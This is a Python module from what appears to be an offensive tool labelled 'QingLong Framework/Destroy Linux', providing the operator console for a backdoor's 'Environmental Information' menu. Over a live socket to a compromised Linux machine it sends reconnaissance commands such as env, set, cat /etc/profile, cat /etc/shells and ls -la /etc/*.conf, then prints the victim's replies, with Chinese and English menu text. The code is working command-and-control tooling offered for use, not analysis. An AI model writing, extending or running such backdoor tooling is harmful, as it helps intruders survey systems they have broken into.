import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def EnvironmentalInformation(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Destroy Linux)-\033[0m\033[1;31;31m[BackDoor/Information ~ Environmental Information] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == "":
            continue
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 显示所有的环境变量:" + '\033[0m')
            command = "env"
            receive(conn, command)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 显示本地环境变量:" + '\033[0m')
            command = "set"
            receive(conn, command)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 环境变量中的路径信息:" + '\033[0m')
            command = "echo $PATH"
            receive(conn, command)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 显示默认系统变量:" + '\033[0m')
            command = "cat /etc/profile"
            receive(conn, command)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 显示可用的shell:" + '\033[0m')
            command = "cat /etc/shells"
            receive(conn, command)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 查看etc下所有配置文件:" + '\033[0m')
            command = "ls -la /etc/*.conf"
            receive(conn, command)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Environmental Information" + '\033[0m' + "\n" + '=' * len("Environmental Information") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Display all environment variables", "显示所有的环境变量"], ["2", "Display local environment variables", "显示本地环境变量"],
              ["3", "Display path information in environment variables", "环境变量中的路径信息"], ["4", "Display default system variables", "显示默认系统变量"],
              ["5", "Display available shells", "显示可用的shell"], ["6", "View all configuration files under etc", "查看etc下所有配置文件"]]
    MyTable.createTable(headers, mydata)
